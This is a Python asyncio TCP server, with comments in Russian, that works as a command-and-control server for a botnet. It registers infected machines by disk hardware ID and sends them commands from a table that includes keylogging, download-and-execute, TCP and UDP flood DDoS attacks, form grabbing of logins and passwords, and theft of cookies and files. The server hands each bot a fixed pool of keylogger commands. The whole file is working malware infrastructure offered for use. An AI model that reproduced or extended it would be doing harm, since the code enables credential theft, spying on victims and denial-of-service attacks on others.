import asyncio


COMMANDS_BOTS = {
    "COMMAND_JOIN": 0,					    # Регистрация бота на сервере
    "COMMAND_POLL": 1,					    # Запрос новых команд
    "COMMAND_CHECKIFSITEISUP": 2,		    # Проверка доступности сайта
    "COMMAND_SHUTDOWN": 3,				    # Выключение системы
    "COMMAND_RESTART": 4,				    # Перезагрузка системы
    "COMMAND_MESSAGEBOX": 5,			    # Вывод сообщения на экран
    "COMMAND_KEYLOG": 6,				    # Управление кейлоггером
    "COMMAND_REMOTEPROCESS": 7,			    # Получение информации о процессе
    "COMMAND_DOWNLOADEXECUTE": 8,		    # Скачивание и выполнение файла
    "COMMAND_REMOTEPROCESSNORESULT": 9,	    # Запуск процесса без вывода
    "COMMAND_TCPFLOOD": 10,				    # DDoS-атака (TCP-флуд)
    "COMMAND_UPDATE": 11,				    # Обновление бота
    "COMMAND_SCREENSHOT": 12,			    # Создание скриншота
    "COMMAND_UDPFLOOD": 13,				    # DDoS-атака (UDP-флуд)
    "COMMAND_FORMGRAB": 14,				    # Кража данных форм (логины/пароли)
    "COMMAND_STEALERS": 15,  			    # Кража данных (Cookies, файлов)
    "COMMAND_OFF_BOTS": -1,
    "COMMAND_WAIT": 250
}
POOL_COMMAND = ["1!6!start", "2!250!", "3!6!check_buf", "4!6!stop"]
BOTS = {}
COUNT_BOTS = 0


def request_processing(addr, data):
    # серверная часть
    data_str = data.decode('ascii').strip().strip('\x00')
    # print(data_str)
    # data.rstrip('\x00')  # удаляет \x00 с правой части получнного запроса
    print(f"From: {addr} Received: {data_str}")
    if not data:
        return -1
    # Process
    if data_str == b"close":
        return -1
    # data = data.upper()
    data_str = data_str.split("|")
    if data_str[1] == "0":
        hwid = data_str[2].split("@")[0]  # Уникальный идентификатор диска
        print(hwid)
        if hwid in BOTS.keys():
            return f"-1|0|{BOTS[hwid]}".encode()
        else:
            global COUNT_BOTS
            COUNT_BOTS += 1
            BOTS[hwid] = COUNT_BOTS
            return f"-1|0|{BOTS[hwid]}".encode()
    if data_str[1] == "1":
        return ("1|1|" + "\n".join(POOL_COMMAND)).encode()
    if data_str[1] == "6":
        return b"OK"
    return b"-1|500|"


async def handle_connection(reader, writer):
    addr = writer.get_extra_info("peername")
    print("Connected by", addr)
    while True:
        # Receive
        try:
            data = await reader.read(1024)  # New
        except ConnectionError:
            print(f"Client suddenly closed while receiving from {addr}")
            break

        data = request_processing(addr, data)  # обработка запроса к серверу
        if data == -1:
            break
        # Send
        try:
            writer.write(data)  # New
            await writer.drain()
            print(f"Send: {data} to: {addr}")
        except ConnectionError:
            print(f"Client suddenly closed, cannot send")
            break

    writer.close()
    print("Disconnected by", addr)


async def main(host, port):
    server = await asyncio.start_server(handle_connection, host, port)
    print(f"Start server...")
    async with server:
        await server.serve_forever()

HOST = ""  # Symbolic name meaning all available interfaces
PORT = 50007  # Arbitrary non-privileged port

if __name__ == "__main__":

    asyncio.run(main(HOST, PORT))
